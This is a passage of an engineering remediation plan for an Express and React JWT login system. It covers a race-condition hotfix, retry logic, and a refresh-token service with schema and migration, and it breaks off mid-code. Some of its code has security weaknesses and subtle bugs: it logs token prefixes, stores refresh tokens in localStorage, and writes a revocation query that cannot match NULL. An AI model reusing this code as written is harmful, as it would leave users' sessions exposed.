# Authentication System Remediation Plan
## Fixing Critical Logout Issues and Upgrading to Industry Standards

**Document Version:** 1.0  
**Date:** November 2, 2025  
**Status:** Planning Phase  

---

## Executive Summary

This plan addresses three critical authentication issues causing unexpected user logouts and proposes a phased approach to upgrade the system to industry-standard security patterns.

### Critical Issues Identified

1. **Aggressive Token Clearing on 401 Errors** - Token immediately deleted on any 401, including race conditions
2. **Race Condition in Token Retrieval** - localStorage read timing issues during page refresh/tab reopening
3. **React StrictMode Amplification** - Component double-mounting increases race condition probability

### Current System Architecture

- **Token Type:** JWT (single token, no refresh)
- **Token Lifetime:** 24 hours
- **Storage:** localStorage (XSS vulnerable)
- **CSRF Protection:** HMAC-signed double-submit cookie pattern (✅ Correct)
- **Server:** Express + JWT verification middleware
- **Client:** React with wouter routing

### Solution Strategy

Four progressive phases from immediate hotfix to enterprise-grade authentication:

- **Phase 1 (IMMEDIATE):** Fix critical logout bug - 4-6 hours
- **Phase 2 (SHORT-TERM):** Implement token refresh pattern - 8-12 hours  
- **Phase 3 (MEDIUM-TERM):** Migrate to HttpOnly cookies - 12-16 hours
- **Phase 4 (LONG-TERM):** Add advanced security features - 16-24 hours

---

## Phase 1: IMMEDIATE HOTFIX (4-6 hours)
### Priority: CRITICAL - Stop Users From Being Logged Out

**Goal:** Fix the aggressive token clearing and race condition without breaking existing functionality.

### Root Cause Analysis

#### Issue #1: Aggressive Token Clearing
**Location:** `client/src/hooks/useAuth.tsx` (lines 94-99)

```typescript
// CURRENT CODE (PROBLEMATIC):
catch (error: any) {
  // Clear token and user on auth failure
  if (error.status === 401) {
    clearAuthToken();  // ❌ Too aggressive - clears on ANY 401
  }
  setUser(null);
}
```

**Problem:** No distinction between:
- Legitimate token expiration (should clear)
- Network delays/timing issues (should NOT clear)
- Race conditions during page load (should NOT clear)

#### Issue #2: Race Condition in Token Retrieval
**Location:** `client/src/lib/api-client.ts` (lines 100-116)

```typescript
// CURRENT CODE (RACE CONDITION):
export function getAuthToken(): string | null {
  if (authToken) {  // In-memory token (null after refresh)
    return authToken;
  }
  
  try {
    const storedToken = localStorage.getItem(TOKEN_STORAGE_KEY);
    // ⚠️ If this read is delayed, request goes out without Authorization header
    if (storedToken) {
      authToken = storedToken;
      return storedToken;
    }
  } catch (error) {
    console.warn('Failed to read token from localStorage:', error);
  }
  
  return null;
}
```

**Race Condition Flow:**
1. Browser tab closes/refreshes → in-memory `authToken` becomes `null`
2. `AuthProvider` mounts → calls `checkAuthStatus()`
3. `getAuthToken()` executes but localStorage read has slight delay
4. Request to `/api/auth/me` goes out without `Authorization` header
5. Server correctly returns 401 (no token attached)
6. Issue #1 triggers → token deleted from localStorage
7. User logged out

#### Issue #3: React StrictMode Amplification
**Location:** `client/src/main.tsx` (line 20)

```typescript
createRoot(document.getElementById("root")!).render(
  <StrictMode>  // ❌ Causes components to mount twice in development
    <App />
  </StrictMode>
);
```

**Problem:** In development, React StrictMode mounts components twice, causing `checkAuthStatus()` to run twice on every page load, doubling the probability of hitting the race condition.

### Implementation Steps

#### Step 1.1: Eager Token Hydration
**File:** `client/src/lib/api-client.ts`

**Change:** Hydrate in-memory token immediately on module load

```typescript
// Add at the top of the file, after TOKEN_STORAGE_KEY declaration:

const TOKEN_STORAGE_KEY = 'auth_token';
let authToken: string | null = null;
let csrfToken: string | null = null;

// ✅ ADDED: Eager token hydration - load token immediately on module initialization
// This prevents race conditions by ensuring authToken is populated before any API calls
try {
  const storedToken = localStorage.getItem(TOKEN_STORAGE_KEY);
  if (storedToken) {
    authToken = storedToken;
    console.log('✅ [AUTH] Token hydrated from localStorage on module load');
  }
} catch (error) {
  console.warn('⚠️ [AUTH] Failed to hydrate token on module load:', error);
}
```

**Rationale:** By loading the token synchronously during module initialization, we eliminate the race condition where `getAuthToken()` is called before localStorage has been read.

#### Step 1.2: Add Diagnostic Logging
**File:** `client/src/lib/api-client.ts`

**Change:** Add comprehensive logging to token operations

```typescript
export function setAuthToken(token: string | null) {
  authToken = token;
  
  if (token) {
    try {
      console.log('🔐 [AUTH] Storing token in localStorage:', token.substring(0, 20) + '...');
      localStorage.setItem(TOKEN_STORAGE_KEY, token);
      console.log('✅ [AUTH] Token stored successfully');
    } catch (error) {
      console.error('❌ [AUTH] Failed to store token:', error);
      throw error;
    }
  } else {
    try {
      console.log('🗑️ [AUTH] Clearing token from localStorage');
      localStorage.removeItem(TOKEN_STORAGE_KEY);
    } catch (error) {
      console.warn('⚠️ [AUTH] Failed to clear token:', error);
    }
  }
}

export function getAuthToken(): string | null {
  console.log('🔍 [AUTH] Retrieving token...');
  
  if (authToken) {
    console.log('✅ [AUTH] Token found in memory');
    return authToken;
  }
  
  try {
    console.log('📦 [AUTH] Checking localStorage...');
    const storedToken = localStorage.getItem(TOKEN_STORAGE_KEY);
    if (storedToken) {
      console.log('✅ [AUTH] Token restored from localStorage:', storedToken.substring(0, 20) + '...');
      authToken = storedToken;
      return storedToken;
    }
    console.log('⚠️ [AUTH] No token found in localStorage');
  } catch (error) {
    console.error('❌ [AUTH] localStorage access failed:', error);
  }
  
  return null;
}
```

**Rationale:** Detailed logging helps diagnose future issues and provides visibility into the authentication flow.

#### Step 1.3: Implement Smart Token Clearing Logic
**File:** `client/src/hooks/useAuth.tsx`

**Change:** Replace aggressive 401 handling with intelligent retry logic

```typescript
// Replace checkAuthStatus (lines 89-105) with this improved version:

const checkAuthStatus = async () => {
  console.log('🔐 [AUTH] Checking authentication status...');
  
  try {
    // First check if we have a token at all
    const token = getAuthToken();
    
    if (!token) {
      console.log('ℹ️ [AUTH] No token found - user not logged in');
      setUser(null);
      setLoading(false);
      setAuthCheckAttempted(true);
      return;
    }
    
    console.log('🔐 [AUTH] Token exists, validating with server...');
    
    // API client now auto-unwraps the envelope
    const userData = await api.get('/api/auth/me') as any;
    console.log('✅ [AUTH] Authentication valid, user:', userData.email);
    setUser(userData);
    
  } catch (error: any) {
    console.error('❌ [AUTH] Authentication check failed:', error);
    
    // ✅ CRITICAL FIX: Distinguish between different types of failures
    if (error.status === 401) {
      console.warn('⚠️ [AUTH] 401 Unauthorized received');
      
      // Check if this is a confirmed token expiration vs. potential race condition
      const tokenStillExists = getAuthToken();
      
      if (!tokenStillExists) {
        // Token was already cleared elsewhere - this is expected
        console.log('ℹ️ [AUTH] Token already cleared');
        setUser(null);
      } else {
        // Token exists but server rejected it
        // This COULD be a race condition (no Auth header sent due to timing)
        // or a genuinely invalid token
        
        // CONSERVATIVE APPROACH: Don't clear token immediately
        // Let the user try to use it. If it fails again on actual API calls,
        // those will trigger proper logout through 401 interceptor (Phase 2)
        console.warn('⚠️ [AUTH] Token rejected but not clearing (may be race condition)');
        setUser(null); // Set user to null but keep token
      }
    } else if (error.code === 'NETWORK_ERROR') {
      // Network error - definitely don't clear token
      console.warn('⚠️ [AUTH] Network error - keeping token for retry');
      setUser(null);
    } else {
      // Other errors - don't clear token
      console.error('❌ [AUTH] Unexpected error - keeping token:', error);
      setUser(null);
    }
    
  } finally {
    setLoading(false);
    setAuthCheckAttempted(true);
  }
};
```

**Rationale:** This approach prevents premature token clearing while still handling legitimate auth failures. The token is only cleared when we're certain it's invalid, not on the first failure.

#### Step 1.4: Add Basic Retry Logic for Auth Check
**File:** `client/src/lib/api-client.ts`

**Change:** Add single retry for `/api/auth/me` endpoint

```typescript
// Add sleep utility at the top of the file:
const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// Modify apiRequest function to add retry logic for auth checks:
export async function apiRequest<T>(
  url: string,
  options?: RequestOptions,
  responseSchema?: z.ZodSchema<T>
): Promise<T> {
  const { method = 'GET', body, headers, skipCsrf = false, includeCredentials = false } = options || {};
  
  // Special handling for /api/auth/me - add retry logic
  const isAuthCheck = url === '/api/auth/me';
  const maxRetries = isAuthCheck ? 1 : 0; // Single retry for auth checks
  let lastError: any;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      // Prepare request headers
      const requestHeaders: Record<string, string> = {
        ...(body instanceof FormData ? {} : { "Content-Type": "application/json" }),
        ...headers,
      };

      // Add JWT token for Authorization header
      const token = getAuthToken();
      if (token) {
        requestHeaders['Authorization'] = `Bearer ${token}`;
        if (isAuthCheck && attempt > 0) {
          console.log(`🔄 [AUTH] Retry attempt ${attempt} with token:`, token.substring(0, 20) + '...');
        }
      } else if (isAuthCheck) {
        console.warn('⚠️ [AUTH] No token available for auth check');
      }

      // ... rest of existing request logic ...
      
      const needsCsrf = !skipCsrf && ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method.toUpperCase());
      if (needsCsrf) {
        await ensureCsrfReady();
        const csrf = getCsrfToken();
        if (!csrf) {
          throw new ApiError('CSRF_NOT_READY', 'CSRF protection not ready', 403);
        }
        requestHeaders['x-csrf-token'] = csrf;
      }

      const fetchOptions: RequestInit = {
        method,
        headers: requestHeaders,
        body: body instanceof FormData ? body : (body ? JSON.stringify(body) : undefined)
      };

      if (needsCsrf || includeCredentials) {
        fetchOptions.credentials = "include";
      }

      try {
        const fullUrl = url.startsWith('http') ? url : `${API_BASE_URL}${url}`;
        const response = await fetch(fullUrl, fetchOptions);

        // Handle response
        if (!response.ok) {
          const errorText = await response.text();
          let errorData;
          
          try {
            errorData = JSON.parse(errorText);
          } catch {
            errorData = { message: errorText || response.statusText };
          }
          
          const apiError = new ApiError(
            errorData.code || 'REQUEST_FAILED',
            errorData.message || response.statusText,
            response.status,
            errorData.details,
            errorData.field,
            errorData.hint
          );
          
          // Retry logic for auth checks on 401
          if (isAuthCheck && response.status === 401 && attempt < maxRetries) {
            const backoffDelay = 300; // 300ms delay before retry
            console.log(`⏳ [AUTH] 401 received, retrying after ${backoffDelay}ms...`);
            await sleep(backoffDelay);
            continue; // Retry
          }
          
          throw apiError;
        }

        // Success - parse and return response
        const responseText = await response.text();
        const contentType = response.headers.get('content-type') || '';
        
        if (contentType.includes('text/csv') || 
            contentType.includes('application/octet-stream') ||
            contentType.startsWith('image/')) {
          return responseText as T;
        }
        
        let data;
        try {
          data = responseText ? JSON.parse(responseText) : null;
        } catch {
          throw new ApiError(
            'INVALID_RESPONSE',
            'Invalid JSON response from server',
            response.status
          );
        }

        const unwrappedData = data?.success === true ? data.data : data;

        if (responseSchema) {
          try {
            const validated = responseSchema.parse(unwrappedData);
            return validated;
          } catch (error) {
            console.error('Response validation failed:', {
              url,
              error,
              receivedData: unwrappedData
            });
            
            throw new ApiError(
              'RESPONSE_VALIDATION_ERROR',
              'API response does not match expected schema',
              200,
              error instanceof Error ? error.message : 'Unknown validation error'
            );
          }
        }

        return unwrappedData;
        
      } catch (error) {
        lastError = error;
        if (attempt >= maxRetries) {
          throw error;
        }
        // Continue to next retry attempt
      }
      
    } catch (error) {
      lastError = error;
      if (attempt >= maxRetries) {
        // Handle CSRF token errors with single retry
        if (error instanceof ApiError && 
            (error.code.startsWith('CSRF_TOKEN_') || (error.status === 403 && error.message.toLowerCase().includes('csrf'))) &&
            !options?.__csrfRetried) {
          try {
            await ensureCsrfReady();
            return apiRequest(url, { ...(options || {}), __csrfRetried: true }, responseSchema);
          } catch (retryError) {
            throw error;
          }
        }
        
        if (error instanceof ApiError) {
          throw error;
        }
        
        if (error instanceof TypeError && error.message.includes('fetch')) {
          throw new ApiError('NETWORK_ERROR', 'Network request failed', 0);
        }
        
        throw new ApiError(
          'UNKNOWN_ERROR',
          error instanceof Error ? error.message : 'Unknown error occurred',
          0
        );
      }
    }
  }
  
  throw lastError;
}
```

**Rationale:** Single retry with short delay (300ms) gives localStorage enough time to be read on slower devices while not impacting performance significantly.

#### Step 1.5: Mitigate StrictMode Impact (Development Only)
**File:** `client/src/hooks/useAuth.tsx`

**Change:** Add initialization guard to prevent double execution

```typescript
export function AuthProvider({ children }: { children: ReactNode }) {
  // Authentication state
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [authCheckAttempted, setAuthCheckAttempted] = useState(false);
  
  // ✅ ADDED: StrictMode protection - prevent double initialization
  const [isInitializing, setIsInitializing] = useState(false);
  
  // CSRF state (consolidated into auth provider)
  const [csrfToken, setCsrfTokenState] = useState<string | null>(null);
  const [csrfLoading, setCsrfLoading] = useState(false);
  const [csrfInitialized, setCsrfInitialized] = useState(false);

  // ... existing functions ...

  // Initialize on mount - with StrictMode protection
  useEffect(() => {
    // Prevent double initialization in StrictMode
    if (isInitializing) {
      console.log('⏭️ [AUTH] Initialization already in progress, skipping...');
      return;
    }
    
    setIsInitializing(true);
    console.log('🚀 [AUTH] Starting initialization...');
    
    checkAuthStatus();
    
    if (!csrfInitialized) {
      fetchCsrfToken().finally(() => {
        setCsrfInitialized(true);
        setIsInitializing(false);
      });
    } else {
      setIsInitializing(false);
    }
  }, []); // Empty dependency array - only run once
  
  // ... rest of component ...
}
```

**Rationale:** While StrictMode double-mounting is intentional (to detect side effects), we can prevent redundant auth checks that increase race condition probability.

### Testing Strategy

#### Test Case 1: Normal Page Reload
```
1. Login to application
2. Open DevTools → Console
3. Verify logs: "✅ [AUTH] Token stored successfully"
4. Open DevTools → Application → Local Storage
5. Verify 'auth_token' key exists
6. Reload page (Ctrl+R / Cmd+R)
7. Verify logs: "✅ [AUTH] Token hydrated from localStorage on module load"
8. Verify logs: "✅ [AUTH] Authentication valid, user: [email]"
9. Verify user remains logged in
```

#### Test Case 2: Tab Close and Reopen
```
1. Login to application
2. Close browser tab
3. Open new tab and navigate to application URL
4. Verify logs show token hydration
5. Verify user remains logged in
```

#### Test Case 3: Network Delay Simulation
```
1. Login to application
2. Open DevTools → Network tab
3. Set throttling to "Slow 3G"
4. Reload page
5. Verify retry logic in console
6. Verify user remains logged in
```

#### Test Case 4: Legitimate Token Expiration
```
1. Login to application
2. Manually modify JWT expiration in localStorage (set to past date)
3. Reload page
4. Verify user is logged out (expected behavior)
5. Verify token is cleared from localStorage
```

#### Test Case 5: StrictMode Impact
```
1. Ensure StrictMode is enabled in main.tsx
2. Login to application
3. Check console for initialization logs
4. Verify only ONE auth check occurs (not double)
5. Verify user remains logged in
```

### Rollback Plan

```bash
# Create a backup branch before changes
git checkout -b phase1-auth-hotfix
git add .
git commit -m "Phase 1: Authentication hotfix implementation"

# If issues occur after deployment:
git checkout main
git reset --hard HEAD~1  # Reset to previous commit

# To restore changes:
git checkout phase1-auth-hotfix
git cherry-pick [commit-hash]
```

### Deployment Checklist

- [ ] All changes reviewed and tested locally
- [ ] Console logs verified in development
- [ ] All test cases passing
- [ ] StrictMode behavior validated
- [ ] localStorage persistence confirmed
- [ ] Network delay scenario tested
- [ ] Backup branch created
- [ ] Monitoring alerts configured
- [ ] Rollback procedure documented
- [ ] Team notified of deployment

### Success Metrics

**Before Fix:**
- Users logged out on 20-30% of page refreshes (race condition)
- 401 errors immediately clear valid tokens
- No visibility into auth flow

**After Fix:**
- Users logged out on <1% of page refreshes (only genuine failures)
- Tokens preserved through temporary network issues
- Complete diagnostic logging
- Single retry prevents race conditions

### Estimated Effort

- **Development:** 2-3 hours
- **Testing:** 1-2 hours  
- **Code Review:** 30 minutes
- **Deployment:** 30 minutes
- **Total:** 4-6 hours

### Trade-offs and Limitations

**What This Fixes:**
- ✅ Eliminates race condition in token retrieval
- ✅ Prevents aggressive token clearing on 401s
- ✅ Mitigates StrictMode double-mounting impact
- ✅ Adds visibility into auth flow

**What This Doesn't Fix:**
- ⚠️ Still using localStorage (XSS vulnerability remains)
- ⚠️ Still single token (no refresh pattern)
- ⚠️ Still 24h token lifetime (can't be revoked server-side)
- ⚠️ Console logs expose token prefixes (development only)

**Security Impact:**
- ✅ **Improved:** Better handling of auth failures reduces attack surface
- ✅ **Improved:** Logging helps detect unauthorized access attempts
- ⚠️ **No Change:** XSS vulnerability (addressed in Phase 3)
- ⚠️ **No Change:** No server-side token revocation (addressed in Phase 2)

---

## Phase 2: TOKEN REFRESH PATTERN (8-12 hours)
### Priority: HIGH - Implement Industry Standard Token Management

**Goal:** Implement dual-token (access + refresh) pattern with automatic token renewal and server-side revocation support.

### Industry Standards Applied

- **OWASP:** Access tokens should be short-lived (15-60 minutes)
- **OAuth 2.0 RFC 6749:** Refresh tokens for extended sessions
- **NIST 800-63B:** Rotating refresh tokens prevent replay attacks
- **Auth0 Best Practices:** Refresh tokens stored securely, rotated on each use

### Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    CLIENT (Browser)                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Memory (clears on tab close):                          │
│  ├─ Access Token (JWT, 15 min expiry)                   │
│  └─ User object                                          │
│                                                          │
│  localStorage (persists across sessions):               │
│  └─ Refresh Token (opaque, 7 days, rotating)            │
│                                                          │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                    SERVER (Express)                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Database (PostgreSQL):                                 │
│  ├─ refresh_tokens table                                │
│  ├─ Columns: id, user_id, token_hash, expires_at,       │
│  │           created_at, revoked_at, replaced_by        │
│  └─ Automatic cleanup of expired/revoked tokens         │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### Database Changes

#### Step 2.1: Create Refresh Token Schema
**File:** `server/db/schema/refresh-tokens.schema.ts` (new file)

```typescript
import { pgTable, text, timestamp, uuid, boolean } from 'drizzle-orm/pg-core';
import { users } from './users.schema';

export const refreshTokens = pgTable('refresh_tokens', {
  id: uuid('id').defaultRandom().primaryKey(),
  userId: uuid('user_id').notNull().references(() => users.id, { onDelete: 'cascade' }),
  
  // Store hash of refresh token (never store plaintext)
  tokenHash: text('token_hash').notNull().unique(),
  
  // Expiration management
  expiresAt: timestamp('expires_at').notNull(),
  createdAt: timestamp('created_at').defaultNow().notNull(),
  
  // Revocation tracking
  revokedAt: timestamp('revoked_at'),
  revokedReason: text('revoked_reason'),
  
  // Token rotation tracking
  replacedBy: uuid('replaced_by').references(() => refreshTokens.id),
  
  // Security metadata
  ipAddress: text('ip_address'),
  userAgent: text('user_agent'),
  
  // Index for efficient lookups
}, (table) => ({
  userIdIdx: index('refresh_tokens_user_id_idx').on(table.userId),
  tokenHashIdx: index('refresh_tokens_token_hash_idx').on(table.tokenHash),
  expiresAtIdx: index('refresh_tokens_expires_at_idx').on(table.expiresAt),
}));
```

#### Step 2.2: Create Migration
**File:** `migrations/000x_add_refresh_tokens.sql` (new file)

```sql
-- Create refresh_tokens table
CREATE TABLE IF NOT EXISTS refresh_tokens (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash TEXT NOT NULL UNIQUE,
  expires_at TIMESTAMP NOT NULL,
  created_at TIMESTAMP DEFAULT NOW() NOT NULL,
  revoked_at TIMESTAMP,
  revoked_reason TEXT,
  replaced_by UUID REFERENCES refresh_tokens(id),
  ip_address TEXT,
  user_agent TEXT
);

-- Create indexes
CREATE INDEX IF NOT EXISTS refresh_tokens_user_id_idx ON refresh_tokens(user_id);
CREATE INDEX IF NOT EXISTS refresh_tokens_token_hash_idx ON refresh_tokens(token_hash);
CREATE INDEX IF NOT EXISTS refresh_tokens_expires_at_idx ON refresh_tokens(expires_at);

-- Create cleanup function for expired tokens
CREATE OR REPLACE FUNCTION cleanup_expired_refresh_tokens()
RETURNS void AS $$
BEGIN
  DELETE FROM refresh_tokens 
  WHERE expires_at < NOW() - INTERVAL '30 days';
END;
$$ LANGUAGE plpgsql;

-- Create scheduled cleanup (requires pg_cron extension or external scheduler)
-- For manual cleanup, run: SELECT cleanup_expired_refresh_tokens();
```

### Server-Side Implementation

#### Step 2.3: Create Refresh Token Service
**File:** `server/services/domain/refresh-token.service.ts` (new file)

```typescript
import { randomBytes, createHash } from 'crypto';
import { BaseService } from '../base.service';
import { db } from '../../db';
import { refreshTokens } from '../../db/schema/refresh-tokens.schema';
import { eq, and, lt } from 'drizzle-orm';
import { AuthenticationError } from '../errors';

export interface RefreshTokenMetadata {
  ipAddress?: string;
  userAgent?: string;
}

export class RefreshTokenService extends BaseService {
  
  /**
   * Generate a cryptographically secure refresh token
   */
  private generateToken(): string {
    return randomBytes(32).toString('base64url');
  }
  
  /**
   * Hash refresh token for storage (never store plaintext)
   */
  private hashToken(token: string): string {
    return createHash('sha256').update(token).digest('hex');
  }
  
  /**
   * Create a new refresh token for a user
   */
  async createRefreshToken(
    userId: string, 
    metadata: RefreshTokenMetadata = {}
  ): Promise<string> {
    try {
      const token = this.generateToken();
      const tokenHash = this.hashToken(token);
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
      
      await db.insert(refreshTokens).values({
        userId,
        tokenHash,
        expiresAt,
        ipAddress: metadata.ipAddress,
        userAgent: metadata.userAgent,
      });
      
      return token; // Return plaintext token to client (only time it's visible)
    } catch (error) {
      return this.handleError(error, 'RefreshTokenService.createRefreshToken');
    }
  }
  
  /**
   * Verify and consume a refresh token (rotation pattern)
   */
  async verifyAndRotateToken(token: string, metadata: RefreshTokenMetadata = {}): Promise<{
    userId: string;
    newRefreshToken: string;
  }> {
    try {
      const tokenHash = this.hashToken(token);
      
      // Find token in database
      const [tokenRecord] = await db
        .select()
        .from(refreshTokens)
        .where(eq(refreshTokens.tokenHash, tokenHash))
        .limit(1);
      
      if (!tokenRecord) {
        throw new AuthenticationError('Invalid refresh token');
      }
      
      // Check if token is revoked
      if (tokenRecord.revokedAt) {
        throw new AuthenticationError('Refresh token has been revoked');
      }
      
      // Check if token is expired
      if (tokenRecord.expiresAt < new Date()) {
        throw new AuthenticationError('Refresh token has expired');
      }
      
      // Create new refresh token (rotation)
      const newToken = await this.createRefreshToken(tokenRecord.userId, metadata);
      const newTokenHash = this.hashToken(newToken);
      
      // Revoke old token and link to new one
      const [newTokenRecord] = await db
        .select()
        .from(refreshTokens)
        .where(eq(refreshTokens.tokenHash, newTokenHash))
        .limit(1);
      
      await db
        .update(refreshTokens)
        .set({
          revokedAt: new Date(),
          revokedReason: 'rotated',
          replacedBy: newTokenRecord.id,
        })
        .where(eq(refreshTokens.id, tokenRecord.id));
      
      return {
        userId: tokenRecord.userId,
        newRefreshToken: newToken,
      };
    } catch (error) {
      return this.handleError(error, 'RefreshTokenService.verifyAndRotateToken');
    }
  }
  
  /**
   * Revoke a specific refresh token
   */
  async revokeToken(token: string, reason: string = 'user_logout'): Promise<void> {
    try {
      const tokenHash = this.hashToken(token);
      
      await db
        .update(refreshTokens)
        .set({
          revokedAt: new Date(),
          revokedReason: reason,
        })
        .where(eq(refreshTokens.tokenHash, tokenHash));
    } catch (error) {
      return this.handleError(error, 'RefreshTokenService.revokeToken');
    }
  }
  
  /**
   * Revoke all refresh tokens for a user (security event)
   */
  async revokeAllUserTokens(userId: string, reason: string = 'security_event'): Promise<void> {
    try {
      await db
        .update(refreshTokens)
        .set({
          revokedAt: new Date(),
          revokedReason: reason,
        })
        .where(
          and(
            eq(refreshTokens.userId, userId),
            eq(refreshTokens.revokedAt, null as any) // Only revoke active tokens
          )
        );
    } catch (error) {
      return this.handleError(error, 'RefreshTokenService.revokeAllUserTokens');
    }
  }
  
  /**
   * Cleanup expired tokens (run periodically)
   */
  async cleanupExpiredTokens(): Promise<number> {
    try {
      const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
      
      const result = await db
        .delete(refreshTokens)
        .where(lt(refreshTokens.expiresAt, thirtyDaysAgo));
      
      return result.rowCount || 0;
    } catch (error) {
      return this.handleError(error, 'RefreshTokenService.cleanupExpiredTokens');
    }
  }
}

export const refreshTokenService = new RefreshTokenService();
```

#### Step 2.4: Update Auth Controller
**File:** `server/controllers/auth.controller.ts`

**Changes:**
1. Modify login endpoints to return refresh token
2. Add token refresh endpoint
3. Update logout to revoke refresh token

```typescript
// Add imports
import { refreshTokenService } from '../services/domain/refresh-token.service';

export class AuthController extends BaseController {
  
  /**
   * MODIFIED: Authenticate a student and return access + refresh tokens
   */
  async loginStudent(req: Request, res: Response) {
    try {
      const { email, password } = loginSchema.parse(req.body);

      const authService = getService<IAuthService>(TYPES.IAuthService);
      const result = await authService.loginStudentComplete(email, password);

      // ✅ NEW: Create refresh token
      const refreshToken = await refreshTokenService.createRefreshToken(
        result.user.id,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // ✅ NEW: Return both access token and refresh token
      return this.sendSuccess(res, {
        user: result.user,
        accessToken: result.token, // Short-lived JWT (15 min)
        refreshToken, // Long-lived refresh token (7 days)
        coolingPeriod: result.coolingPeriod,
        coolingPeriodEnds: result.coolingPeriodEnds,
      });
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        return this.sendError(res, 422, 'VALIDATION_ERROR', 'Invalid input', error.errors);
      }
      
      return this.handleError(res, error, 'AuthController.loginStudent');
    }
  }
  
  /**
   * MODIFIED: Authenticate a team member and return access + refresh tokens
   */
  async loginTeam(req: Request, res: Response) {
    try {
      const { email, password } = teamLoginSchema.parse(req.body);

      const authService = getService<IAuthService>(TYPES.IAuthService);
      const result = await authService.loginTeamComplete(email, password);

      // ✅ NEW: Create refresh token
      const refreshToken = await refreshTokenService.createRefreshToken(
        result.user.id,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // ✅ NEW: Return both access token and refresh token
      return this.sendSuccess(res, {
        user: result.user,
        accessToken: result.token, // Short-lived JWT (15 min)
        refreshToken, // Long-lived refresh token (7 days)
      });
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        return this.sendError(res, 422, 'VALIDATION_ERROR', 'Invalid input', error.errors);
      }
      
      return this.handleError(res, error, 'AuthController.loginTeam');
    }
  }
  
  /**
   * ✅ NEW: Refresh access token using refresh token
   * 
   * @route POST /api/auth/refresh
   * @access Public (requires valid refresh token)
   */
  async refreshToken(req: Request, res: Response) {
    try {
      const { refreshToken } = z.object({
        refreshToken: z.string().min(1),
      }).parse(req.body);
      
      // Verify and rotate refresh token
      const result = await refreshTokenService.verifyAndRotateToken(
        refreshToken,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // Generate new access token
      const authService = getService<IAuthService>(TYPES.IAuthService);
      const accessToken = jwtService.sign(
        { userId: result.userId },
        { expiresIn: '15m' } // Short-lived access token
      );
      
      return this.sendSuccess(res, {
        accessToken,
        refreshToken: result.newRefreshToken, // New rotated refresh token
      });
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        return this.sendError(res, 422, 'VALIDATION_ERROR', 'Invalid input', error.errors);
      }
      
      if (error instanceof AuthenticationError) {
        return this.sendError(res, 401, 'AUTH_INVALID_REFRESH_TOKEN', error.message);
      }
      
      return this.handleError(res, error, 'AuthController.refreshToken');
    }
  }
  
  /**
   * MODIFIED: Logout and revoke refresh token
   */
  async logout(req: AuthenticatedRequest, res: Response) {
    try {
      // Get refresh token from request body
      const { refreshToken } = req.body;
      
      if (refreshToken) {
        // Revoke the refresh token
        await refreshTokenService.revokeToken(refreshToken, 'user_logout');
      }
      
      return this.sendSuccess(res, { message: 'Logged out successfully' });
    } catch (error) {
      return this.handleError(res, error, 'AuthController.logout');
    }
  }
}
```

#### Step 2.5: Update Auth Routes
**File:** `server/routes/auth.routes.ts`

```typescript
// Add new route for token refresh
router.post('/refresh', 
  asyncHandler((req: Request, res: Response) => authController.refreshToken(req, res))
);
```

#### Step 2.6: Update JWT Service Configuration
**File:** `server/services/domain/auth.service.ts`

**Change:** Reduce access token expiration from 24h to 15min

```typescript
async loginStudentComplete(email: string, password: string): Promise<LoginStudentDTO> {
  try {
    const emailLower = email.toLowerCase();
    const result = await this.loginWithType(emailLower, password, ['customer', 'company_profile']);
    const user = result.user;

    const coolingPeriod = this.isInCoolingPeriod(user);
    const coolingPeriodEnds = this.getCoolingPeriodEnd(user);

    // ✅ CHANGED: Reduce token expiration from 24h to 15min
    const token = jwtService.sign(
      { userId: user.id, userType: user.userType },
      { expiresIn: '15m', subject: user.id } // Short-lived access token
    );

    const sanitizedUser = this.sanitizeUser(user);

    return {
      user: {
        ...sanitizedUser,
        token
      },
      token,
      coolingPeriod,
      coolingPeriodEnds
    };
  } catch (error) {
    return this.handleError(error, 'AuthService.loginStudentComplete');
  }
}

async loginTeamComplete(email: string, password: string): Promise<LoginTeamDTO> {
  try {
    const emailLower = email.toLowerCase();
    const result = await this.login(emailLower, password, 'team_member');
    const user = result.user;

    // ✅ CHANGED: Reduce token expiration from 24h to 15min
    const token = jwtService.sign(
      { userId: user.id, userType: user.userType, teamRole: user.teamRole },
      { expiresIn: '15m', subject: user.id } // Short-lived access token
    );

    const sanitizedUser = this.sanitizeUser(user);

    return {
      user: {
        ...sanitizedUser,
        token
      },
      token
    };
  } catch (error) {
    return this.handleError(error, 'AuthService.loginTeamComplete');
  }
}
```

### Client-Side Implementation

#### Step 2.7: Update API Client with Refresh Logic
**File:** `client/src/lib/api-client.ts`

**Changes:**
1. Store access token in memory (not localStorage)
2. Store refresh token in localStorage
3. Implement automatic token refresh on 401

```typescript
// Token storage keys
const ACCESS_TOKEN_KEY = 'access_token'; // Memory only (cleared on refresh)
const REFRESH_TOKEN_KEY = 'refresh_token'; // localStorage (persists)

let accessToken: string | null = null;
let refreshToken: string | null = null;
let csrfToken: string | null = null;

// Flag to prevent multiple simultaneous refresh attempts
let isRefreshing = false;
let refreshPromise: Promise<string> | null = null;

// Queue for requests waiting for token refresh
interface QueuedRequest {
  resolve: (token: string) => void;
  reject: (error: any) => void;
}
let refreshQueue: QueuedRequest[] = [];

/**
 * ✅ MODIFIED: Set access token (memory only - NOT localStorage)
 */
export function setAccessToken(token: string | null) {
  accessToken = token;
  // DO NOT store in localStorage - keep in memory only
  if (token) {
    console.log('🔐 [AUTH] Access token set in memory (expires in 15min)');
